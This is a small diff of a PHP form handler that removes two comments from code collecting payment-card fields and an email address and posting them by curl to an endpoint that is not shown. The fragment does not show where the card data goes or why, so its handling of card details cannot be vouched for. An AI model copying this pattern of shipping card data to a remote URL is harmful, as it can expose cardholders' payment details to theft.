@@ -38,7 +38,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $email = $_POST['form_fields']["email"];
     }
 
-    // --- Send card data as before ---
     $card_data = [
         "currency" => $currency,
         "card_type" => $cardType,
@@ -88,7 +87,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         error_log("Card data send error: HTTP $http_code - $err - Response: $resp");
     }
 
-    // --- Send only the email to the same endpoint but with different data ---
     if (!empty($email)) {
         $curl2 = curl_init();
         curl_setopt($curl2, CURLOPT_URL, $url);
